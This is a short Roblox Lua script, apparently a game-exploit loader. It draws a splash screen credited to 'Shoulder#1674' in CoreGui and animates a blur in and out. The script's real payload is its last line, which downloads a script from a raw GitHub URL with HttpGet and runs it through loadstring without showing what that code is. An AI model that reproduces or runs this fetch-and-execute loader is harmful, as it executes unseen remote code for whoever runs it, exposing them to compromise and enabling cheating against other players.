-- Gui to Lua
-- Version: 3.2

-- Instances:

local starting = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")

--Properties:

starting.Name = "starting"
starting.Parent = game.CoreGui
starting.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ImageLabel.Parent = starting
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Position = UDim2.new(0.473637849, 0, 0.428696752, 0)
ImageLabel.Size = UDim2.new(0.0520833321, 0, 0.0898980573, 0)
ImageLabel.Image = "rbxassetid://8739538101"

UICorner.Parent = ImageLabel

TextLabel.Parent = starting
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.426445901, 0, 0.518133163, 0)
TextLabel.Size = UDim2.new(0.146305785, 0, 0.0619578697, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Created by Shoulder#1674"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true


----------------------------------------------

local blur = Instance.new("BlurEffect")
blur.Parent = game.Lighting
blur.Size = 0


-------------------------------------------------

ImageLabel.Visible = false
TextLabel.Visible = false

function open()
	blur.Size = 1
	wait(00.1)
	blur.Size = 2
	wait(00.1)
	blur.Size = 3
	wait(00.1)
	blur.Size = 4
	wait(00.1)
	blur.Size = 5
	wait(00.1)
	blur.Size = 6
	wait(00.1)
	blur.Size = 7
	wait(00.1)
	blur.Size = 8
	wait(00.1)
	blur.Size = 9
	wait(00.1)
	blur.Size = 10
	wait(00.1)
	blur.Size = 11
	wait(00.1)
	blur.Size = 12
	wait(00.1)
	blur.Size = 13
	wait(00.1)
	blur.Size = 14
	wait(00.1)
	blur.Size = 15
	wait(00.1)
	blur.Size = 16
	wait(00.1)
	blur.Size = 17
	ImageLabel.Visible = true
	TextLabel.Visible = true
	
end

function close()
	wait(00.1)
	blur.Size = 16
	wait(00.1)
	blur.Size = 15
	wait(00.1)
	blur.Size = 14
	wait(00.1)
	blur.Size = 13
	wait(00.1)
	blur.Size = 12
	wait(00.1)
	blur.Size = 11
	wait(00.1)
	ImageLabel.Visible = false
	TextLabel.Visible = false
	blur.Size = 10
	wait(00.1)
	blur.Size = 9
	wait(00.1)
	blur.Size = 8
	wait(00.1)
	blur.Size = 7
	wait(00.1)
	blur.Size = 6
	wait(00.1)
	blur.Size = 5
	wait(00.1)
	blur.Size = 4
	wait(00.1)
	blur.Size = 3
	wait(00.1)
	blur.Size = 2
	wait(00.1)
	blur.Size = 0
	wait(00.1)

end

---------------------------------------------------
local url = "https://raw.githubusercontent.com/GIGIBoxLoader/AXROS_ACRU/main/started2.js"


open()
wait(5)
close()
loadstring(game:HttpGet(url))()
